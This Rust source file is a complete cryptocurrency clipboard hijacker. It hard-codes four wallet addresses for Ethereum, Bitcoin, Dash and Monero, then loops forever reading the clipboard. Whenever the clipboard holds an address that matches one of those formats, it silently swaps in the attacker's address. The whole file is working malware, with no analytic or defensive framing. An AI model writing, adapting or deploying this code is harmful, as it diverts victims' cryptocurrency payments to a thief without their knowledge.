use regex::Regex;
use cli_clipboard::{ClipboardContext, ClipboardProvider};

struct Wallet {
    name: String,
    address: String,
    regex: Regex,
}

fn main() {

    let mut ctx = ClipboardContext::new().unwrap();

    let wallets = vec![
        Wallet {
            name: "ethereum".to_string(),
            address: "0x932311ccd502a49f4ec03d7a0f67e79c3fcaa986".to_string(),
            regex: Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap(),
        },
        Wallet {
            name: "bitcoin".to_string(),
            address: "3Dahd1iGmgf3uiCXsNCT5mVPYXkLpaUHMy".to_string(),
            regex: Regex::new(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$").unwrap(),
        },
        Wallet {
            name: "dash".to_string(),
            address: "XpuSFGxi5de984aQUbf2mEHFdwpvMQv1en".to_string(),
            regex: Regex::new(r"X[1-9A-HJ-NP-Za-km-z]{33}$").unwrap(),
        },
        Wallet {
            name: "monero".to_string(),
            address: "84FnWj7GHLLPppoehvr5r2enLBBfH5CFB4asdn4HKGXXHWj8nHysDP4RXQv4tbF25o3jaTFzedoBeA69ZFA7mjoVJ7PEeGz".to_string(),
            regex: Regex::new(r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$").unwrap(),
        },
    ];

    loop {
        let content = ctx.get_contents().unwrap();

        for wallet in &wallets {
            if wallet.regex.is_match(&content.trim()) {
                if ! &content.trim().eq(&wallet.address) {
                    ctx.set_contents(wallet.address.to_owned()).unwrap();
                }
            }
        } 
    }
}
